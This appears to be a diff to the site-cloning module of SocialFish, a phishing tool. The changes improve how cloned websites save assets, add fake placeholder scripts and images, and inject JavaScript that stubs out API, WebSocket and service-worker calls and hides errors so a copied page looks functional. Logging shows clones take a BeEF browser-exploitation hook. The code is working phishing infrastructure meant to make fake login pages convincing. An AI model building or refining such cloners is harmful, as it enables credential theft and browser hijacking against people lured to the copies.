-            extension = self._get_extension(url, headers.get('content-type', ''), resource_type)
-            filename = f"resource_{url_hash}{extension}"
-            subdir = self._get_subdir(resource_type)
-            resource_dir = output_dir / subdir
-            resource_dir.mkdir(exist_ok=True)
-            file_path = resource_dir / filename
-            local_path = f"{subdir}/{filename}"
+            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
         
         # Universal binary save (works for all sites)
+        try:
+            with open(file_path, 'wb') as f:
+                f.write(content)
+            return local_path
+        except OSError as e:
+            logger.error(f"File save failed: {e}, trying hash-based naming")
+            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
+    
+    def _save_dynamic_resource_safe(self, content, url, output_dir, resource_type, headers):
+        """Save dynamic resources with safe filename handling"""
+        parsed_url = urllib.parse.urlparse(url)
+        
+        # Extract filename from dynamic URL
+        path_parts = parsed_url.path.split('/')
+        original_filename = path_parts[-1] if path_parts else 'resource'
+        
+        # SAFE FILENAME: Limit length and sanitize
+        if len(original_filename) > 100:  # Too long, use hash
+            url_hash = hashlib.sha256(url.encode()).hexdigest()[:16]
+            extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
+            filename = f"dyn_{url_hash}{extension}"
+        else:
+            # Use original but ensure proper extension
+            if '.' not in original_filename:
+                extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
+                filename = f"{original_filename}{extension}"
+            else:
+                filename = original_filename
+        
+        # Sanitize filename for filesystem safety
+        filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
+        
+        # Save in appropriate subdirectory
+        subdir = self._get_subdir_enhanced(resource_type)
+        resource_dir = output_dir / subdir
+        resource_dir.mkdir(exist_ok=True)
+        file_path = resource_dir / filename
+        local_path = f"{subdir}/{filename}"
+        
+        # Ensure path isn't too long
+        if len(str(file_path)) > 250:
+            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
+        
+        # Save file
+        try:
+            with open(file_path, 'wb') as f:
+                f.write(content)
+            return local_path
+        except OSError as e:
+            logger.warning(f"Dynamic resource save failed: {e}, using hash fallback")
+            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
+    
+    def _save_with_hash_name(self, content, url, output_dir, resource_type, headers):
+        """Fallback save method using hash-based naming (always works)"""
+        url_hash = hashlib.sha256(url.encode()).hexdigest()[:16]
+        extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
+        filename = f"res_{url_hash}{extension}"
+        subdir = self._get_subdir_enhanced(resource_type)
+        resource_dir = output_dir / subdir
+        resource_dir.mkdir(exist_ok=True)
+        file_path = resource_dir / filename
+        local_path = f"{subdir}/{filename}"
+        
+        # This should always work as it's a short, safe filename
         with open(file_path, 'wb') as f:
             f.write(content)
         
         return local_path
+    
+    def _get_extension_enhanced(self, url: str, content_type: str, resource_type: str) -> str:
+        """Enhanced extension detection"""
+        # Try URL extension first
+        try:
+            parsed = urllib.parse.urlparse(url)
+            if parsed.path:
+                _, ext = os.path.splitext(parsed.path)
+                if ext and len(ext) <= 5:
+                    return ext
+        except Exception:
+            pass
+        
+        # Enhanced content type mapping
+        extensions = {
+            'text/css': '.css',
+            'application/javascript': '.js',
+            'text/javascript': '.js',
+            'image/jpeg': '.jpg',
+            'image/png': '.png',
+            'image/gif': '.gif',
+            'image/svg+xml': '.svg',
+            'image/webp': '.webp',
+            'image/avif': '.avif',
+            'font/woff2': '.woff2',
+            'font/woff': '.woff',
+            'application/font-woff': '.woff',
+            'application/font-woff2': '.woff2',
+            'font/ttf': '.ttf',
+            'font/otf': '.otf'
+        }
+        
+        # Special handling for resource types
+        if resource_type == 'svg':
+            return '.svg'
+        elif resource_type == 'image' and not content_type:
+            return '.jpg'  # Default for images
+        
+        return extensions.get(content_type.split(';')[0] if content_type else '', '.bin')
+    
+    def _get_subdir_enhanced(self, resource_type: str) -> str:
+        """Enhanced subdirectory mapping"""
+        subdirs = {
+            'css': 'css',
+            'js': 'js', 
+            'image': 'images',
+            'svg': 'images',  # SVGs go in images folder
+            'font': 'fonts',
+            'asset': 'assets'
+        }
+        return subdirs.get(resource_type, 'assets')
+    
+    def _create_placeholder_resources(self, output_dir: Path):
+        """Create placeholder files for common missing resources to prevent 404s"""
+        try:
+            # Common missing files that cause 404s
+            placeholder_files = [
+                ('favicon.ico', 'assets', b''),  # Empty favicon
+                ('fluidicon.png', 'images', b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\xda\x63\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82'),  # 1x1 PNG
+                ('hsts-pixel.gif', 'images', b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00;'),  # 1x1 GIF
+                ('chunk-vendors.js', 'js', b'// Placeholder chunk file\nconsole.log("Chunk loaded");'),
+                ('runtime.js', 'js', b'// Placeholder runtime\nwindow.__webpack_require__ = function(){};'),
+                ('polyfill.js', 'js', b'// Placeholder polyfill\n'),
+                ('main.js', 'js', b'// Placeholder main script\n'),
+            ]
+            
+            for filename, subdir, content in placeholder_files:
+                file_dir = output_dir / subdir
+                file_dir.mkdir(exist_ok=True)
+                file_path = file_dir / filename
+                
+                # Only create if doesn't exist
+                if not file_path.exists():
+                    with open(file_path, 'wb') as f:
+                        f.write(content)
+                    logger.debug(f"Created placeholder: {file_path}")
+            
+            # Create common subdirectories if they don't exist
+            for subdir in ['security', 'cdn-cgi/challenge-platform/scripts/jsd', 'token']:
+                (output_dir / subdir).mkdir(parents=True, exist_ok=True)
+            
+        except Exception as e:
+            logger.debug(f"Placeholder creation failed: {e}")  # Non-critical, just log
     
     async def _save_resource(self, content: bytes, metadata: Dict[str, Any],
                            resource_type: str, output_dir: Path) -> Optional[str]:
@@ -891,7 +1412,7 @@ class SocialFishContentProcessor:
         try:
             url = metadata.get('url', '')
             content_type = metadata.get('content_type', '')
-            extension = self._get_extension(url, content_type, resource_type)
+            extension = self._get_extension_enhanced(url, content_type, resource_type)
             parsed_url = urllib.parse.urlparse(url)
             
             # Validate content
@@ -900,7 +1421,7 @@ class SocialFishContentProcessor:
                 return None
             
             # Determine save path - preserve structure for images
-            if resource_type == 'image' and parsed_url.path and parsed_url.path != '/':
+            if resource_type in ['image', 'svg'] and parsed_url.path and parsed_url.path != '/':
                 original_path = parsed_url.path.lstrip('/')
                 file_path = output_dir / original_path
                 file_path.parent.mkdir(parents=True, exist_ok=True)
@@ -908,7 +1429,7 @@ class SocialFishContentProcessor:
             else:
                 url_hash = hashlib.sha256(url.encode()).hexdigest()[:12]
                 filename = f"resource_{url_hash}{extension}"
-                subdir = self._get_subdir(resource_type)
+                subdir = self._get_subdir_enhanced(resource_type)
                 resource_dir = output_dir / subdir
                 resource_dir.mkdir(exist_ok=True)
                 file_path = resource_dir / filename
@@ -943,47 +1464,6 @@ class SocialFishContentProcessor:
             logger.error(f"Save failed for {url}: {e}")
             return None
     
-    def _get_extension(self, url: str, content_type: str, resource_type: str) -> str:
-        """Get file extension"""
-        # Try URL extension
-        try:
-            parsed = urllib.parse.urlparse(url)
-            if parsed.path:
-                _, ext = os.path.splitext(parsed.path)
-                if ext and len(ext) <= 5:
-                    return ext
-        except Exception:
-            pass
-        
-        # Use content type
-        extensions = {
-            'text/css': '.css',
-            'application/javascript': '.js',
-            'text/javascript': '.js',
-            'image/jpeg': '.jpg',
-            'image/png': '.png',
-            'image/gif': '.gif',
-            'image/svg+xml': '.svg',
-            'image/webp': '.webp',
-            'font/woff2': '.woff2',
-            'font/woff': '.woff',
-            'application/font-woff': '.woff',
-            'application/font-woff2': '.woff2'
-        }
-        
-        return extensions.get(content_type.split(';')[0] if content_type else '', '.bin')
-    
-    def _get_subdir(self, resource_type: str) -> str:
-        """Get subdirectory for resource type"""
-        subdirs = {
-            'css': 'css',
-            'js': 'js', 
-            'image': 'images',
-            'font': 'fonts',
-            'asset': 'assets'
-        }
-        return subdirs.get(resource_type, 'assets')
-    
     def _process_forms_for_socialfish(self, soup: BeautifulSoup):
         """Process forms for SocialFish integration"""
         for form in soup.find_all('form'):
@@ -1004,6 +1484,120 @@ class SocialFishContentProcessor:
         body = soup.find('body')
         if body:
             body.append(script)
+    
+    def _add_universal_ajax_blocking(self, soup: BeautifulSoup):
+        """Enhanced universal AJAX blocking to prevent 405 errors on any site"""
+        script = soup.new_tag('script')
+        script.string = '''
+        (function() {
+            // Enhanced Universal AJAX blocking to prevent 405 errors
+            const blockedPatterns = [
+                '/ajax/', '/api/', '/graphql', '/_api/', '/rpc/',
+                '/webstorage', '/analytics', '/tracking', '/metrics',
+                '/beacon', '/collect', '/report', '/log', '/bz?',
+                '/process_keys', '/telemetry', '/events', '/ping'
+            ];
+            
+            // Enhanced XMLHttpRequest blocking
+            if (window.XMLHttpRequest) {
+                const originalOpen = XMLHttpRequest.prototype.open;
+                XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+                    if (typeof url === 'string' && blockedPatterns.some(pattern => url.includes(pattern))) {
+                        console.log('🛡️ Blocked AJAX call to prevent 405 error:', url);
+                        // Create a mock XHR that appears to work but doesn't make requests
+                        this.readyState = 4;
+                        this.status = 200;
+                        this.responseText = '{}';
+                        this.response = '{}';
+                        setTimeout(() => {
+                            if (typeof this.onreadystatechange === 'function') {
+                                this.onreadystatechange();
+                            }
+                            if (typeof this.onload === 'function') {
+                                this.onload();
+                            }
+                        }, 10);
+                        return;
+                    }
+                    return originalOpen.call(this, method, url, async, user, password);
+                };
+                
+                // Also block send to be extra safe
+                const originalSend = XMLHttpRequest.prototype.send;
+                XMLHttpRequest.prototype.send = function(data) {
+                    if (this.readyState === 4) return; // Already blocked
+                    return originalSend.call(this, data);
+                };
+            }
+            
+            // Enhanced fetch blocking with better error handling
+            if (window.fetch) {
+                const originalFetch = window.fetch;
+                window.fetch = function(url, options) {
+                    if (typeof url === 'string' && blockedPatterns.some(pattern => url.includes(pattern))) {
+                        console.log('🛡️ Blocked fetch call to prevent 405 error:', url);
+                        return Promise.resolve(new Response('{}', {
+                            status: 200,
+                            statusText: 'OK',
+                            headers: new Headers({'Content-Type': 'application/json'})
+                        }));
+                    }
+                    return originalFetch.apply(this, arguments).catch(err => {
+                        console.log('🛡️ Fetch error caught and handled:', err);
+                        return new Response('{}', {status: 200});
+                    });
+                };
+            }
+            
+            // Block WebSocket connections that might cause issues
+            if (window.WebSocket) {
+                const originalWebSocket = window.WebSocket;
+                window.WebSocket = function(url, protocols) {
+                    console.log('🛡️ Blocked WebSocket connection:', url);
+                    const mockSocket = {
+                        close: function() {},
+                        send: function() {},
+                        addEventListener: function() {},
+                        removeEventListener: function() {},
+                        readyState: 3, // CLOSED
+                        CONNECTING: 0, OPEN: 1, CLOSING: 2, CLOSED: 3
+                    };
+                    // Trigger close event after a delay
+                    setTimeout(() => {
+                        if (typeof mockSocket.onclose === 'function') {
+                            mockSocket.onclose();
+                        }
+                    }, 100);
+                    return mockSocket;
+                };
+            }
+            
+            // Block Service Workers that might interfere
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register = function() {
+                    console.log('🛡️ Blocked service worker registration');
+                    return Promise.resolve({unregister: () => Promise.resolve()});
+                };
+            }
+            
+            // Silence console errors for blocked requests
+            const originalError = console.error;
+            console.error = function(...args) {
+                const message = args[0];
+                if (typeof message === 'string' && 
+                    (message.includes('405') || message.includes('Failed to fetch') || 
+                     message.includes('NetworkError') || message.includes('CORS'))) {
+                    console.log('🛡️ Suppressed error:', message);
+                    return;
+                }
+                return originalError.apply(this, args);
+            };
+        })();
+        '''
+        
+        head = soup.find('head')
+        if head:
+            head.insert(0, script)
     
     def _add_socialfish_js(self, soup: BeautifulSoup):
         """Add SocialFish-specific JavaScript"""
@@ -1153,7 +1747,7 @@ class SocialFishCloner:
             'timestamp': time.time(),
             'duration': time.time() - start_time,
             'stats': self.resource_manager.stats,
-            'socialfish_version': '2.0_advanced'
+            'socialfish_version': '2.0_css_background_fixed'
         }
         
         async with aiofiles.open(output_dir / 'metadata.json', 'w') as f:
@@ -1215,7 +1809,7 @@ def clone(url: str, user_agent: str, beef: str) -> bool:
         bool: True if cloning successful, False otherwise
     """
     try:
-        logger.info(f"🐟 SocialFish Advanced Clone Request: {url}")
+        logger.info(f"🐟 SocialFish FINAL Enhanced Clone Request: {url}")
         logger.info(f"👤 User Agent: {user_agent[:50]}...")
         logger.info(f"🥩 BeEF Hook: {beef}")
         
@@ -1223,14 +1817,14 @@ def clone(url: str, user_agent: str, beef: str) -> bool:
         result = clone_async(url, user_agent, beef)
         
         if result:
-            logger.info("✅ SocialFish clone completed successfully")
+            logger.info("✅ SocialFish FINAL clone completed successfully")
         else:
-            logger.error("❌ SocialFish clone failed")
+            logger.error("❌ SocialFish FINAL clone failed")
         
         return result
         
     except Exception as e:
-        logger.error(f"❌ SocialFish clone error: {e}")
+        logger.error(f"❌ SocialFish FINAL clone error: {e}")
         return False
 
 # Test function for universal usage
@@ -1245,7 +1839,7 @@ if __name__ == "__main__":
     
     test_user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
     
-    print("🧪 Testing UNIVERSAL SocialFish cloner...")
+    print("🧪 Testing FINAL FIXED SocialFish cloner...")
     print("Select a site to test:")
     for i, (url, name) in enumerate(test_sites, 1):
         print(f"{i}. {name} ({url})")
